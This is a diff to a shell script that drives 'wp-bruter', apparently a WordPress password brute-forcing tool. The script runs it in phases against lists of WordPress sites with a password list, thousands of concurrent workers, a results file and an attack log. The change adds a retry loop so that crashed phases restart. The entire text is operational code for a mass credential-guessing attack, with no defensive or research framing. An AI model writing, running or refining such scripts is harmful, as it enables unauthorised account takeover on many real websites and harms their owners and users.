@@ -15,18 +15,32 @@ ulimit -n 262144 2>/dev/null || ulimit -n 65535 2>/dev/null
 for LIM in ${PHASES:-150 500 0}; do
     # Keep the log from filling the disk across long multi-phase runs.
     [ -f attack.log ] && [ "$(stat -c%s attack.log)" -gt 104857600 ] && mv -f attack.log attack.log.1
-    ./wp-bruter \
-        -sites "/root/wordpress.s$IDX" \
-        -passlist pass.txt \
-        -output results.txt \
-        -max-workers "${WORKERS_PER_BOX:-3000}" \
-        -max-active-sites "${ACTIVE_PER_BOX:-2500}" \
-        -prep-workers "${PREP_PER_BOX:-768}" \
-        -max-attempts "$LIM" \
-        -timeout "${TIMEOUT:-12}" \
-        -verbose >> attack.log 2>&1
-    # Wait for this phase's process to disappear before the next one starts,
-    # otherwise the PID guard refuses it and the pass is skipped.
-    for _ in $(seq 1 40); do pgrep -f "wp-bruter -sites" >/dev/null || break; sleep 1; done
-    sleep 2
+    tries=0
+    while :; do
+        ./wp-bruter \
+            -sites "/root/wordpress.s$IDX" \
+            -passlist pass.txt \
+            -output results.txt \
+            -max-workers "${WORKERS_PER_BOX:-3000}" \
+            -max-active-sites "${ACTIVE_PER_BOX:-2500}" \
+            -prep-workers "${PREP_PER_BOX:-768}" \
+            -max-attempts "$LIM" \
+            -timeout "${TIMEOUT:-12}" \
+            -verbose >> attack.log 2>&1
+        rc=$?
+        # Wait for this phase's process to disappear before the next one starts,
+        # otherwise the PID guard refuses it and the pass is skipped.
+        for _ in $(seq 1 40); do pgrep -f "wp-bruter -sites" >/dev/null || break; sleep 1; done
+        sleep 2
+        [ "$rc" -eq 0 ] && break
+        # fasthttp can still panic under extreme concurrency; progress.txt makes
+        # a restart of the same phase cheap.
+        tries=$((tries + 1))
+        if [ "$tries" -ge 5 ]; then
+            echo "phase $LIM gave up after $tries tries (rc=$rc)"
+            break
+        fi
+        echo "phase $LIM rc=$rc — retry $tries/5"
+        sleep 15
+    done
 done
